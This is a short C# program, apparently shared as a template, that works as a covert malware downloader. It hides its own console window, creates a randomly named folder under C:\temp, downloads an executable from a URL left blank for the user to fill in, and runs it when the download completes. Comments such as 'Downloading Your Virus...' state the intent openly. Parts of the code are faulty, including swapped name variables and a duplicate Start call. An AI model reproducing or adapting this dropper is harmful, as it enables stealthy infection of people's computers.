using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace BackgroundDownloader
{
    class Program
    {
        // Import DLL 
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static AsyncCompletedEventHandler Completed { get; private set; }

        static void Main(string[] args)
        {
            string name = ""; // Yourprogram name
            string name_link = "";
            Console.Title = Guid.NewGuid().ToString();
            // hide the console for user
            var handler = GetConsoleWindow();
            ShowWindow(handler, 0);
            // Creating Tempfile
            string temp = @"C:\temp\" + Guid.NewGuid();
            Directory.CreateDirectory(temp);
            string grapped = temp + $"\\{name_link}.exe";
            // Trying to install.
            try
            {
                // Downloading Your Virus...
                WebClient webClient = new WebClient();
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                // Download the file
                webClient.DownloadFileAsync(new Uri($"{name}"), grapped);
            }
            catch
            {
                Environment.Exit(1);
            }
            void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
            {

            }
            // if its Completed..
            void Completed(object sender, AsyncCompletedEventArgs e)
            {
                // set var for process
                var p = Process.Start(grapped);
                // if it done
                p.Start();
               
                
     
            }
            // checks if the program is running
            if (Process.GetProcessesByName($"{name}.exe").Length > 0)
            {          }
            // If its not running then do this
            else
            {
                
                Thread.Sleep(10000);
                Console.Clear();
                Environment.Exit(1);
            }

        }

    }

}
